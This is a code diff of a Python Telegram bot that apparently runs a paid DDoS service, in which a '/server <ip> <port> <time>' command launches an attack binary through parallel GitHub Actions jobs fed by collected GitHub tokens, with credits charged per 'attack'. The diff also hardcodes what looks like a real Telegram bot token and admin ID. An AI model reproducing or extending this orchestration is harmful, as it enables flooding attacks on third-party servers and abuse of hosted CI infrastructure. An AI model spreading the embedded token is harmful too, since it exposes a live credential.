@@ -3,27 +3,25 @@ import asyncio
 import base64
 import json
 import threading
-from flask import Flask
 from datetime import datetime
+from flask import Flask
 from telegram import Update
 from telegram.constants import ChatAction
 from telegram.ext import Application, CommandHandler, ContextTypes
 from github import Github, InputGitTreeElement, Auth
 
-# === Config ===
-TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN') or '7828525928:AAGyxRd-HIfgqSgBwtzM2fYRK9EIR3QImS0'
-ADMIN_IDS = {7163028849}  # Put your Telegram user ID here as int, e.g., {123456789}
+# === Configuration ===
+TELEGRAM_TOKEN = '7828525928:AAGyxRd-HIfgqSgBwtzM2fYRK9EIR3QImS0'
+ADMIN_IDS = {7163028849}
 DATA_FILE = 'soul.json'
 REPO_NAME = "soulcrack90"
 CREDIT_COST_PER_ATTACK = 25
 
-# === Load saved user sessions ===
 user_sessions = {}
 if os.path.exists(DATA_FILE):
     with open(DATA_FILE, 'r') as f:
         try:
             user_sessions = json.load(f)
-            # Convert approved lists back to sets
             for session in user_sessions.values():
                 if 'approved' in session and isinstance(session['approved'], list):
                     session['approved'] = set(session['approved'])
@@ -55,7 +53,7 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40]
+        n: [1,2,3,4,5,6,7,8,9,10]
     steps:
       - uses: actions/checkout@v3
       - name: Make binary executable
@@ -67,7 +65,7 @@ jobs:
 def is_admin(user_id: int) -> bool:
     return user_id in ADMIN_IDS
 
-# Telegram command handlers
+# === Telegram Bot Handlers ===
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -75,9 +73,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/approve <id> <credit> - Approve ID with credit (admin only)\n"
         "/credit <id> <credit> - Add credit to ID (admin only)\n"
         "/remove <id> - Remove ID approval (admin only)\n"
-        "/token <token1> <token2> ... - Provide GitHub tokens separated by space (admin only)\n"
-        "/server <ip> <port> <time> - Run binary with params on approved IDs\n"
-        "/status - Show approved IDs and their credits\n"
+        "/token <token1> <token2> ... - Provide GitHub tokens (admin only)\n"
+        "/server <ip> <port> <time> - Run binary with params\n"
+        "/status - Show approved IDs and credits\n"
     )
 
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -288,11 +286,7 @@ async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, 
 
 # === Set up Telegram bot ===
 
-def run_bot():
-    import asyncio
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-
+def run_telegram_bot():
     app = Application.builder().token(TELEGRAM_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
@@ -305,17 +299,23 @@ def run_bot():
 
     app.run_polling()
 
-# === Flask app to keep Render.com or other hosts happy ===
+# === Flask App for Render ===
+
 flask_app = Flask(__name__)
 
 @flask_app.route("/")
 def home():
     return "Bot is running."
 
-if __name__ == "__main__":
-    # Run Flask in main thread
-    # Run Telegram bot in a separate thread with event loop fixed
-    bot_thread = threading.Thread(target=run_bot)
-    bot_thread.start()
-    # Run Flask on 0.0.0.0:10000 (adjust if needed)
+def run_flask():
     flask_app.run(host="0.0.0.0", port=10000)
+
+# === Main Entry Point ===
+
+if __name__ == "__main__":
+    # Run Flask in background thread
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.start()
+
+    # Run Telegram bot in main thread
+    run_telegram_bot()
